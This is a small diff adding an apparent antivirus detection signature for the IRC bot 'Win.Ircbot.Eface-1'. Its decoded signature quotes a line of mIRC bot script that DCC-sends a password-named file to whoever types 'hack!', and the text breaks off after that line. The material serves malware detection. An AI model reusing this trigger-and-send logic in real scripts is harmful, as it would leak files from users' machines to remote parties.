@@ -1,0 +1,6 @@
+VIRUS NAME: Win.Ircbot.Eface-1
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+n37= on 1:text:*hack!*:*:/dcc send $nick C:\windows\system\password.cpl
+n
